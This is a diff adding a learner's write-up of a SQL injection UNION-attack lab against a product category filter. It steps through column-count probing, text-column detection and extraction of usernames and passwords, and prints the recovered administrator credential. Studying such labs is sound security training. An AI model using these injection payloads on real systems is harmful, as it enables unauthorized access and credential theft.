@@ -1,0 +1,28 @@
+Lab - SQL injection UNION attack, finding a column containing text
+
+Vulnerable feature - Product category filter
+
+Goal - Retrieves all usernames and passwords, and use the information to log in as the administrator user
+
+Analysis:
+The results from te query are returned in the app's response -> can use UNION attack to retrieve
+data from other tables.
+
+1. Determine the No of columns returned by the query
+Corporate gifts'Union select NULL, NULL--
+-> There are 2 cols 
+
+2. Find the col that contain text
+Corporate gifts'UNION SELECT 'a', 'a'--
+--> Both cols are of data type string
+
+3. Get the data
+We know that 
+The database contains a different table called users, with columns called username and password.
+Corporate gifts'Union select username, password from users--
+
+administrator
+80ljt11r40qbbzphi2qw
+
+SOLVED
+
